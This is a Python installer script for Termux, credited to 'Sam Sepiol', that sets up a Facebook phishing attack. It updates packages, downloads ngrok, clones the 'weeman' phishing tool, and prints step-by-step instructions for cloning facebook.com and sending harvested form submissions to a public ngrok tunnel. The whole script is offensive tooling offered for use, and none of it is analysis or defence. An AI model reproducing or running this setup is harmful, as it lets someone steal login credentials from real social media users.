import os

print("=========================================")

print(""" _______    ___       ______  _______ .______     ______     ______    __  ___ 
|   ____|  /   \     /      ||   ____||   _  \   /  __  \   /  __  \  |  |/  / 
|  |__    /  ^  \   |  ,----'|  |__   |  |_)  | |  |  |  | |  |  |  | |  '  /  
|   __|  /  /_\  \  |  |     |   __|  |   _  <  |  |  |  | |  |  |  | |    <   
|  |    /  _____  \ |  `----.|  |____ |  |_)  | |  `--'  | |  `--'  | |  .  \  
.______/__/__   \__\ \______||________.______/__ \______/   \______/  |__|\__\ 
|   _  \  |  |  |  | |  |     /       ||  |  |  |                              
|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |                              
|   ___/  |   __   | |  |     \   \    |   __   |                              
|  |      |  |  |  | |  | .----)   |   |  |  |  |                              
| _|      |__|  |__| |__| |_______/    |__|  |__| """)

print("==========================================")

print("\nScript for Termux")
print("Made by Sam Sepiol")
print("==========================================")

print("\nLet's start, we need to update and install some tools first... ")
include=["Y","N","y","n","yes","no","Yes","No","YES","NO"]
star=input("Do you want to continue? Y/N: ")
while star not in include:
	star=input("You need to choose a valid option (Y, y, N, n, yes, no)")
if star=="N" or star=="n" or star=="no":
	print("Okay, let's try when you want to. Goodbye")
else:
	os.system("pkg update")
	print("==================================")
	print("system updated")
	os.system("pkg upgrade")
	print("==================================")
	print("packages upgraded")
	os.system("pkg install apt")
	print("==================================")
	print("apt installed")
	os.system("apt-get install python2")
	print("==================================")
	print("Python2 installed")
	os.system("apt-get install git")
	print("==================================")
	print("git installed")
	os.system("apt-get install wget")
	print("==================================")
	print("wget installed")
	os.system("cd /data/data/com.termux/files/home && wget  https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
	os.system("cd /data/data/com.termux/files/home && unzip ngrok-stable-linux-arm.zip")
	os.system("cd $home && chmod 755 ngrok")
	os.system("cd $home && cp ngrok /data/data/com.termux/files/usr/bin")
	os.system("cd $home && git clone https://github.com/samyoyo/weeman.git")
	os.system("cd /data/data/com.termux/files/home/weeman && chmod 755 weeman.py")
	os.system("$home")
	print("""\nNow you'll need to start weeman.py with 'python weeman.py'. Use 'show' to start
Now in a new session using termux type 'ngrok http 8080'.
if you want https url just type 'ngrok http -bind-tls=true 8080' 
now go to weeman session opened in termux and type 'set url https://facebook.com'. Next, type set action_url 'xxx_ngrok.io'(this means that you put url that ngrok show to you when you activated it)
and now type 'set port 8080'""")
